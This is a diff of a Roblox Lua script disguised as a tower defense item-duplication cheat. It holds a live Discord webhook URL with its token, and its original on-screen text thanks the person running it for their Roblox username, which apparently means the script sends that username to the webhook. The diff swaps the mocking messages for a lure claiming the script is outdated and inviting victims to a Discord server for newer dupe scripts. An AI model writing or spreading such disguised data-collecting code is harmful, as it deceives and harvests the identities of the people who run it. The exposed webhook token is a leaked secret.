@@ -1,5 +1,5 @@
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1550484102086660136/TKSA-IF5QLpHaCFM9O2GB6NefyOuE9fzcdpkE6blr34u69yH7BoS8aXG2_dHjlSp7osQ"
-local DISCORD_INVITE = "discord.gg/Y8nXgQ98e" -- e.g. "discord.gg/yourserver"
+local DISCORD_INVITE = "discord.gg/TtrKKvSY8K" -- e.g. "discord.gg/yourserver"
  
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -64,7 +64,7 @@ local function showCaughtMessage()
     label.TextColor3 = Color3.new(1, 1, 1)
     label.TextScaled = true
     label.TextWrapped = true
-    label.Text = "thank you for using this slop tower defense dupe script, its really hard to get the users of cheaters its nice youre the one executing this \"dupe cheat\" thanks for your roblox username!"
+    label.Text = "This script is outdated. join our discord for the newest dupe scripts."
     label.Parent = frame
  
     local label2 = Instance.new("TextLabel")
@@ -75,7 +75,7 @@ local function showCaughtMessage()
     label2.TextColor3 = Color3.new(1, 1, 1)
     label2.TextScaled = true
     label2.TextWrapped = true
-    label2.Text = "how can you be ass at cheating, transfer your units while you can dumass"
+    label2.Text = "NO KEY TILL DECEMBER!!!!!!!!!"
     label2.Parent = frame
  
     -- Discord invite box
